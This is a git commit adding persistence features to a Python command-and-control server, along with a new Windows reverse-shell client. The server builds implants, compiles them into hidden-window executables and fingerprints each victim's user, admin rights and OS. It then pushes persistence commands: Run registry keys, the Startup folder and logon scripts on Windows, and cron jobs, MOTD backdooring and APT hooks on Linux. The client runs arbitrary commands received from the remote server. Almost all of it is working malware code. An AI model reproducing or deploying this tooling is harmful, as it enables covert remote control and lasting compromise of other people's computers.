9fa2c01d28d260767ffb3e6775ba9f55e2ab038c
cyb3rblock <chiragarora2595@gmail.com>
2024-02-19 03:38:06 +0530

    Added persistence techniques for windows and linux

--- c2server.py
+++ c2server.py
@@ -2,6 +2,79 @@ import socket
 import sys
 import threading
 from prettytable import PrettyTable
+import random
+import string
+import os
+import os.path
+import shutil
+import subprocess
+
+def winclient():
+    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
+    filename = name+".py"
+    curr_dir = os.getcwd()
+    if os.path.exists(curr_dir+"/"+"winclient.py"):
+        shutil.copy("winclient.py",filename)
+    else:
+        print("File not found")
+    with open(filename) as f:
+        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
+    with open(filename,'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(filename) as f:
+        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
+    with open(filename,'w') as f:
+        f.write(new_host)
+        f.close()
+                
+def linuxclient():
+    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
+    filename = name+".py"
+    curr_dir = os.getcwd()
+    if os.path.exists(curr_dir+"/"+"linuxclient.py"):
+        shutil.copy("linuxclient.py",filename)
+    else:
+        print("File not found")
+    with open(filename) as f:
+        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
+    with open(filename,'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(filename) as f:
+        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
+    with open(filename,'w') as f:
+        f.write(new_host)
+        f.close()
+
+def execlient():
+    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
+    filename = name+".py"
+    exename = name+".py"
+    curr_dir = os.getcwd()
+    if os.path.exists(curr_dir+"/"+"winclient.py"):
+        shutil.copy("winclient.py",filename)
+    else:
+        print("File not found")
+    with open(filename) as f:
+        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
+    with open(filename,'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(filename) as f:
+        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
+    with open(filename,'w') as f:
+        f.write(new_host)
+        f.close()
+    pyinstaller_exec="pyinstaller " + filename + " -w --clean --onefile --distpath ."
+    print("\nCompiling executable file ")
+    subprocess.call(pyinstaller_exec,stderr=subprocess.DEVNULL)
+    os.remove(name+".spec")
+    shutil.rmtree('build')
+    if os.path.exists(curr_dir+"/"+exename):
+        print("Exe saved in current directory")
+    else:
+        print("File not found")
 
 def conn_handler():
     while True:
@@ -10,11 +83,26 @@ def conn_handler():
         try:
             conn, addr = sock.accept()
             print("Connected with ", addr[0])
-            a.append([conn,addr[0]])
+            username=conn_in(conn)
+            admin=conn_in(conn)
+            platform=conn_in(conn)
+            if admin==1:
+                admin_val="Yes"
+            elif username=="root":
+                admin_val="Yes"
+            else:
+                admin_val="No"
+            if 'Windows' in platform:
+                plat_val = 1
+            elif 'Linux' in platform:
+                plat_val = 2
+            else:
+                plat_val = 0
+            a.append([conn,addr[0]],username,admin_val,plat_val)
         except:
             pass
 
-def target_conn(target_id):
+def target_conn(target_id, a, num):
     while True:
         try:
             msg = input('Message to send to client : ')
@@ -25,6 +113,48 @@ def target_conn(target_id):
                 break
             elif msg == 'background':
                 break
+            elif msg == 'help':
+                pass
+            elif msg == 'persist':
+                payload = input("Enter the name of payload with extension to enter persistance")
+                if a[num][6] == 1:
+                    persist_type = input("Enter which type of persistance do you want to use \n 1 for Autorun\n 2 for Startup menu 3 for Logon Script")
+                    if persist_type == 1:
+                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\Public'
+                        conn_out(target_id, persist_command_1)
+                        persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload}'
+                        conn_out(target_id, persist_command_2)
+                        print("Enter following command to clean up registry : \n  reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
+                    elif persist_type == 2:
+                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\{a[num][2]}\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Program\\Startup'
+                        conn_out(target_id, persist_command_1)
+                        print(f'Enter following command to clean up : \n  del /f C:\\Users\\{a[num][2]}\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Program\\Startup')
+                    elif persist_type == 3:
+                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\Public'
+                        conn_out(target_id, persist_command_1)
+                        persist_command_2 = f'reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\Users\\Public\\{payload}'
+                        conn_out(target_id, persist_command_2)
+                        print(f'Enter following command to clean up registry : \n  "reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d"')
+                    else:
+                        print("Enter correct option")
+                        pass
+                elif a[num][6] == 2:
+                    persist_type = input("Enter which type of persistance do you want to use \n 1 for Cronjob\n 2 for MOTD Backdooring(Need to be root) 3 for APT Backdooring(Need to be root)")
+                    if persist_type == 1:
+                        persist_command_1 = f'echo "*/5 * * * * python3 /home/{target[num][3]}/{payload}" | crontab -'
+                        conn_out(target_id, persist_command_1)
+                        print("Enter following command to clean up : \n  crontab -r")
+                    elif persist_type == 2:
+                        persist_command_1 = f'echo "python3 /home/target[num][3]/{payload}" >> /etc/update-motd.d/10-uname'
+                        conn_out(target_id, persist_command_1)
+                        print(f'Enter following command to clean up : \n  sed -i "/python3/d" /etc/update-motd.d/10-uname')
+                    elif persist_type == 3:
+                        persist_command_1 = f'echo "python3 /home/{target[num][0]}/{payload}" >> /etc/apt/apt.conf.d/01persist'
+                        conn_out(target_id, persist_command_1)
+                        print(f'Enter following command to clean up : \n  "rm 01persist"')
+                    else:
+                        print("Enter correct option")
+                        pass
             res = conn_in(target_id)
             if res == 'exit':
                 print('client closed connection')
@@ -47,8 +177,8 @@ def conn_in(conn):
     return res
 def conn_out(conn, msg):
     conn.send(msg.encode())
-def listner_handler():
-    sock.bind((host_ip, host_port))
+def listener_handler():
+    sock.bind((host_ip, int(host_port)))
     print('listening for connection')
     sock.listen()
     t1 = threading.Thread(target=conn_handler)
@@ -57,36 +187,45 @@ def listner_handler():
 if __name__=='__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     a = []
+    listener_count=0
     kill_flag=0
-    try:
-        host_ip=sys.argv[1]
-        host_port=int(sys.argv[2])
-    except IndexError:
-        print("\n Missing arguments")
-    except Exception as e:
-        print("\n")
-        print(e)
-    listner_handler()
     while True:
         try:
-           if not a:
-               continue
-           else:
             command = input("Enter Command : ")
+            if command == "listener -g":
+                host_ip=input("\nEnter the host ip to listen : ")
+                host_port=input("\nEnter host port to listen : ")
+                listener_handler()
+                listener_count += 1
+            if command == "winclient.py":
+                if listener_count > 0:
+                    winclient()
+                else:
+                    print("No active listner available")
+            if command == "linuxclient.py":
+                if listener_count > 0:
+                    linuxclient()
+                else:
+                    print("No active listner available")
+            if command == "execlient":
+                if listener_count > 0:
+                    execlient()
+                else:
+                    print("No active listner available")           
             if command.split(" ")[0].lower() == "sessions":
                 session_counter=0
                 if command.split(" ")[1] == "-l":
                     table=PrettyTable()
-                    table.field_names = ['Session_id', 'Target_ip']
+                    table.field_names = ['Session_id', 'Target_ip','Username','Admin','OS']
                     table.padding_width = 3
                     for target in a:
-                            table.add_row([str(session_counter),target[1]])
+                            table.add_row([str(session_counter),target[1]],target[2],target[3],target[4])
                             session_counter += 1
                     print(table)
                 if command.split(" ")[1] == "-i":
                     num = int(command.split(" ")[2])
                     target_id = a[num][0]
-                    target_conn(target_id)
+                    target_conn(target_id,a,num)
         except KeyboardInterrupt:
             print("\n Keyboard interrupt issued")
             kill_flag=1
---
+++ winclient.py
@@ -0,0 +1,70 @@
+import socket
+import subprocess
+import sys
+import os
+import ctypes
+import time
+import platform
+
+def session_handler():
+    sock.connect((server_ip,server_port))
+    conn_out(os.getlogin())
+    conn_out(ctypes.windll.shell32.IsUserAnAdmin())
+    time.sleep(1)
+    conn_out(platform.uname()[0]+platform.uname()[2])
+    print("Connected with ", server_ip)
+    while True:
+        try:
+            msg = conn_in()
+            if msg == "exit":
+                print("Server terminated connection")
+                sock.close()
+                break
+            elif msg.split(" ")[0] == "cd":
+                try:
+                    directory = str(msg.split(" ")[1])
+                    os.chdir(directory)
+                    res = "Changed to " + os.getcwd()
+                    conn_out(res)
+                except FileNotFoundError:
+                    msg = "Invalid directory. Enter valid directory"
+                    conn_out(msg)
+                    continue
+            elif msg.split(" ")[0] == "pwd":
+                print(os.getcwd())
+                res = os.getcwd()
+                conn_out(res)
+            elif msg == "background":
+                pass
+            else:
+                com = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                res = com.stdout.read() + com.stderr.read()
+                conn_out(res.decode())
+        except KeyboardInterrupt:
+            print('\n keyboard interrupt issued')
+            sock.close()
+            break
+        except Exception:
+            sock.close()
+            break
+def conn_in():
+    print("waiting for server")
+    while True:
+        try:
+            res = sock.recv(1024).decode()
+            print(res)
+            return res
+        except KeyboardInterrupt:
+            print("\n keyboard Interrupt")
+            sock.close()
+        except Exception:
+            sock.close()
+def conn_out(msg):
+    message = str(msg).encode()
+    sock.send(message)
+
+if __name__=='__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_ip="INPUT_IP_HERE"
+    server_port=INPUT_PORT_HERE
+    session_handler()
